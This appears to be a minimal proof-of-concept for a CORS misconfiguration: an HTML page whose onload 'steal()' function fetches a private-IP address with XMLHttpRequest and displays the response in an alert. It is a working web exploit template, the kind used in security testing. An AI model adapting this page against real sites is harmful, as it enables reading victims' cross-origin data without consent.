# CORS-POC

<html>
    <head>
    <script>
        function steal() {
            var r = new XMLHttpRequest();
            r.onreadystatechange = function() {
                if (r.readyState == 4 && r.status == 200) {
                    alert(r.responseText);
                }
            };
            r.open("GET", "http://192.168.78.135", true);
            r.send();
        }
    </script>
    </head>
    <body onload="steal()">
    </body>
</html>
